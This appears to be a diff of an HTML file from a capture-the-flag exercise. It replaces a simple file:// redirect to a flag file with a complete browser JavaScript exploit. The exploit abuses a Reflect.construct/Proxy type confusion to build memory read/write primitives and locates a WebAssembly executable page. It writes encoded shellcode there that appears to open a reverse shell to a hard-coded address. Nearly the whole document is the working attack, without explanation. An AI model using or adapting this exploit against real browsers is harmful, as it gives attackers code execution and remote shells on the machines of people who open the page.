@@ -1,14 +1,289 @@
 <html>
-	<head>
-		<meta http-equiv="Refresh" content="0; url='file:///data/flag.txt'" />
-		<script>
-			window.location.replace("file:///data/flag.txt");
-		</script>
-	</head>
-	<body>
-		<div id="test">asdf</div>
-		<pre>
-		qwerty
-		</pre>
-	</body>
+<head>
+<script>
+
+var shellcode = unescape("%u48fc%ue483%ue8f0%u00c0%u0000%u5141%u5041%u5152%u4856%ud231%u4865%u528b%u4860%u528b%u4818%u528b%u4820%u728b%u4850%ub70f%u4a4a%u314d%u48c9%uc031%u3cac%u7c61%u2c02%u4120%uc9c1%u410d%uc101%uede2%u4152%u4851%u528b%u8b20%u3c42%u0148%u8bd0%u8880%u0000%u4800%uc085%u6774%u0148%u50d0%u488b%u4418%u408b%u4920%ud001%u56e3%uff48%u41c9%u348b%u4888%ud601%u314d%u48c9%uc031%u41ac%uc9c1%u410d%uc101%ue038%uf175%u034c%u244c%u4508%ud139%ud875%u4458%u408b%u4924%ud001%u4166%u0c8b%u4448%u408b%u491c%ud001%u8b41%u8804%u0148%u41d0%u4158%u5e58%u5a59%u5841%u5941%u5a41%u8348%u20ec%u5241%ue0ff%u4158%u5a59%u8b48%ue912%uff57%uffff%u495d%u77be%u3273%u335f%u0032%u4100%u4956%ue689%u8148%ua0ec%u0001%u4900%ue589%ubc49%u0002%u5c11%u11ac%u0300%u5441%u8949%u4ce4%uf189%uba41%u774c%u0726%ud5ff%u894c%u68ea%u0101%u0000%u4159%u29ba%u6b80%uff00%u50d5%u4d50%uc931%u314d%u48c0%uc0ff%u8948%u48c2%uc0ff%u8948%u41c1%ueaba%udf0f%uffe0%u48d5%uc789%u106a%u5841%u894c%u48e2%uf989%uba41%ua599%u6174%ud5ff%u8148%u40c4%u0002%u4900%u63b8%u646d%u0000%u0000%u4100%u4150%u4850%ue289%u5757%u4d57%uc031%u0d6a%u4159%ue250%u66fc%u44c7%u5424%u0101%u8d48%u2444%uc618%u6800%u8948%u56e6%u4150%u4150%u4150%u4950%uc0ff%u5041%uff49%u4dc8%uc189%u894c%u41c1%u79ba%u3fcc%uff86%u48d5%ud231%uff48%u8bca%u410e%u08ba%u1d87%uff60%ubbd5%ub5f0%u56a2%uba41%u95a6%u9dbd%ud5ff%u8348%u28c4%u063c%u0a7c%ufb80%u75e0%ubb05%u1347%u6f72%u006a%u4159%uda89%ud5ff");
+
+
+let conversion_buffer = new ArrayBuffer(8);
+let float_view = new Float64Array(conversion_buffer);
+let int_view = new BigUint64Array(conversion_buffer);
+BigInt.prototype.hex = function() {
+    return '0x' + this.toString(16);
+};
+BigInt.prototype.i2f = function() {
+    int_view[0] = this;
+    return float_view[0];
+}
+BigInt.prototype.smi2f = function() {
+    int_view[0] = this << 32n;
+    return float_view[0];
+}
+Number.prototype.f2i = function() {
+    float_view[0] = this;
+    return int_view[0];
+}
+Number.prototype.f2smi = function() {
+    float_view[0] = this;
+    return int_view[0] >> 32n;
+}
+
+Number.prototype.fhw = function() {
+    float_view[0] = this;
+    return int_view[0] >> 32n;
+}
+
+Number.prototype.flw = function() {
+    float_view[0] = this;
+    return int_view[0] & BigInt(2**32-1);
+}
+
+Number.prototype.i2f = function() {
+    return BigInt(this).i2f();
+}
+Number.prototype.smi2f = function() {
+    return BigInt(this).smi2f();
+}
+
+function hex(a) {
+    return a.toString(16);
+}
+
+
+
+
+
+
+let vuln = [0.1, ,,,,,,,,,,,,,,,,,,,,,, 6.1, 7.1, 8.1];
+var float_rel;      
+var float_carw;     
+var uint64_aarw;    
+var obj_leaker;     
+vuln.pop();
+vuln.pop();
+vuln.pop();
+
+function empty() {}
+
+function f(nt) {
+    
+    vuln.push(typeof(Reflect.construct(empty, arguments, nt)) === Proxy ? 0.2 : 156842065920.05);
+    for (var i = 0; i < 0x10000; ++i) {};
+}
+
+let p = new Proxy(Object, {
+    get: function() {
+        vuln[0] = {};
+        float_rel = [0.2, 1.2, 2.2, 3.2, 4.3];
+        float_carw = [6.6];
+        uint64_aarw = new BigUint64Array(4);
+        obj_leaker = {
+            a: float_rel,
+            b: float_rel,
+        };
+
+        return Object.prototype;
+    }
+});
+
+function main(o) {
+  for (var i = 0; i < 0x10000; ++i) {};
+  return f(o);
+}
+
+
+function crel_read4(offset) {
+    var qw_offset = Math.floor(offset / 2);
+    if (offset & 1 == 1) {
+        return float_rel[qw_offset].fhw();
+    } else {
+        return float_rel[qw_offset].flw();
+    }
+}
+
+
+function crel_write4(offset, val) {
+    var qw_offset = Math.floor(offset / 2);
+    
+    
+    if (offset & 1 == 1) {
+        temp = float_rel[qw_offset].flw();
+        new_val = (val << 32n | temp).i2f();
+        float_rel[qw_offset] = new_val;
+    } else {
+        temp = float_rel[qw_offset].fhw();
+        new_val = (temp << 32n | val).i2f();
+        float_rel[qw_offset] = new_val;
+    }
+}
+
+const float_carw_elements_offset = 0x14;
+
+function cabs_read4(caddr) {
+    elements_addr = caddr - 8n | 1n;
+    crel_write4(float_carw_elements_offset, elements_addr);
+
+    res = float_carw[0].flw();
+    
+    return res;
+}
+
+
+
+function cabs_read8(caddr) {
+    elements_addr = caddr - 8n | 1n;
+    crel_write4(float_carw_elements_offset, elements_addr);
+
+    res = float_carw[0].f2i();
+    
+    return res;
+}
+
+
+function cabs_write4(caddr, val) {
+    elements_addr = caddr - 8n | 1n;
+
+    temp = cabs_read4(caddr + 4n | 1n);
+
+    new_val = (temp << 32n | val).i2f();
+
+    crel_write4(float_carw_elements_offset, elements_addr);
+
+    float_carw[0] = new_val;
+    
+    return res;
+}
+
+const objleaker_offset = 0x41;
+function addrof(o) {
+    obj_leaker.b = o;
+    addr = crel_read4(objleaker_offset) & BigInt(2**32-2);
+    obj_leaker.b = {};
+    return addr;
+}
+
+const uint64_externalptr_offset = 0x1b;     
+
+
+function read8(addr) {
+    faddr = addr.i2f();
+    t1 = float_rel[uint64_externalptr_offset];
+    t2 = float_rel[uint64_externalptr_offset + 1];
+    float_rel[uint64_externalptr_offset] = faddr;
+    float_rel[uint64_externalptr_offset + 1] = 0.0;
+
+    val = uint64_aarw[0];
+
+    float_rel[uint64_externalptr_offset] = t1;
+    float_rel[uint64_externalptr_offset + 1] = t2;
+    return val;
+}
+
+
+function write8(addr, val) {
+    faddr = addr.i2f();
+    t1 = float_rel[uint64_externalptr_offset];
+    t2 = float_rel[uint64_externalptr_offset + 1];
+    float_rel[uint64_externalptr_offset] = faddr;
+    float_rel[uint64_externalptr_offset + 1] = 0.0;
+
+    uint64_aarw[0] = val;
+
+    float_rel[uint64_externalptr_offset] = t1;
+    float_rel[uint64_externalptr_offset + 1] = t2;
+    return val;
+}
+
+
+function writeShellcode(addr, sc) {
+    faddr = addr.i2f();
+    t1 = float_rel[uint64_externalptr_offset];
+    t2 = float_rel[uint64_externalptr_offset + 1];
+    float_rel[uint64_externalptr_offset - 1] = 10;
+    float_rel[uint64_externalptr_offset] = faddr;
+    float_rel[uint64_externalptr_offset + 1] = 0.0;
+
+    for (var i = 0; i < sc.length; ++i) {
+        uint64_aarw[i] = sc[i]
+    }
+
+    float_rel[uint64_externalptr_offset] = t1;
+    float_rel[uint64_externalptr_offset + 1] = t2;
+}
+
+
+function get_compressed_rw() {
+
+    for (var i = 0; i < 0x10000; ++i) {empty();}
+
+    main(empty);
+    main(empty);
+
+    
+    main(p);
+
+}
+
+function get_arw() {
+    get_compressed_rw();
+
+    let previous_elements = crel_read4(0x14);
+    
+    
+    
+    cabs_write4(previous_elements, 0x66554433n);
+
+    uint64_aarw[0] = 0x4142434445464748n;
+}
+
+function rce() {
+    function get_wasm_func() {
+        var importObject = {
+            imports: { imported_func: arg => print(arg) }
+        };
+        bc = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x60, 0x1, 0x7f, 0x0, 0x60, 0x0, 0x0, 0x2, 0x19, 0x1, 0x7, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0xd, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x0, 0x3, 0x2, 0x1, 0x1, 0x7, 0x11, 0x1, 0xd, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x1, 0xa, 0x8, 0x1, 0x6, 0x0, 0x41, 0x2a, 0x10, 0x0, 0xb];
+        wasm_code = new Uint8Array(bc);
+        wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), importObject);
+        return wasm_mod.exports.exported_func;
+    }
+
+    let wasm_func = get_wasm_func();
+    
+    let wasm_func_addr = addrof(wasm_func);
+    let sfi = cabs_read4(wasm_func_addr + 12n) - 1n;
+
+    let WasmExportedFunctionData = cabs_read4(sfi + 4n) - 1n;
+
+    let instance = cabs_read4(WasmExportedFunctionData + 8n) - 1n;
+
+    let wasm_rwx_addr = cabs_read8(instance + 0x68n);
+
+    while(shellcode.length % 4 != 0){
+        shellcode += "邐";
+    }
+
+    let sc = [];
+
+    
+    for (let i = 0; i < shellcode.length; i += 4) {
+        sc.push(BigInt(shellcode.charCodeAt(i)) + BigInt(shellcode.charCodeAt(i + 1) * 0x10000) + BigInt(shellcode.charCodeAt(i + 2) * 0x100000000) + BigInt(shellcode.charCodeAt(i + 3) * 0x1000000000000));
+    }
+
+    writeShellcode(wasm_rwx_addr,sc);
+
+    wasm_func();
+}
+
+
+function exp() {
+    get_arw();
+    rce();
+}
+
+exp();
+
+</script>
+</head>
+<body>
+</body>
 </html>
